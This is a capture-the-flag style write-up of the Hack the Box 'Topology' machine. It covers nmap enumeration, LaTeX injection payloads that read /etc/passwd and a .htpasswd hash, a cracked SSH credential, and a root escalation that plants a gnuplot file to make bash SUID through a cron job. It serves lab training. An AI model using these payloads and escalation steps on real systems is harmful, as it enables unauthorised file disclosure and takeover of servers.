---
title: "Hack the Box - Topology"
slug: "hack-the-box-topology"
date: "2024-03-14"
excerpt: ""
cover: "cover.png"
tags:
  - 
---

## Enumeration
### NMAP

```bash
nmap -sC -sV -v -T4 -oN scans/nmap.txt topology.htb
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Miskatonic University | Topology Group
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## vdaisley
### Website

On port `80`.

![](20230622082239053.png)

Under `Software projects`, there's a link for `LaTex Equation Generator` which is on another subdomain `latex.topology.htb`.

![](20230622102823651.png)

We'll add this new subdomain to `/etc/hosts`.

![](20230622102930900.png)

### LaTex Injection

The website lets us enter LaTex commands. Let's try and use injection to read files on disk.

```latex
$\lstinputlisting{/etc/passwd}$
```

![](20230622104049401.png)

### htpasswd

After some searching around the target knowing the default structure for web servers on Linux we find a hash in `.htpasswd`.

```tex
$\lstinputlisting{/var/www/dev/.htpasswd}$
```

![](20230622110145599.png)

We can crack this using JohnTheRipper.

![](20230622104916950.png)

### SSH

```text
vdaisley:calculus20
```

![](20230622105021848.png)

## Privilege Escalation

If we run `linpeas`, we can see there are some `cron` jobs that run quite frequently. We can use `pspy` to figure out what's running in the background.

![](20230622110922706.png)

### gnuplot

As we can see from `pspy`, `gnuplot` is running as `root` executing any `.plt` file within the `/opt/gnuplot/` directory. If we create our own file in this directory it will get executed via `cron` as `root`.

The following will create a `.plt` file in the `/opt/gnuplot` directory and make `bash` an SUID binary, letting us run it as `root` under our current user.

```shell
echo 'system "chmod u+s /bin/bash"' > gnuplot/test.plt
```

After a few minutes, the file should be executed and we can now execute `bash` with elevated permissions.

![](20230622112339981.png)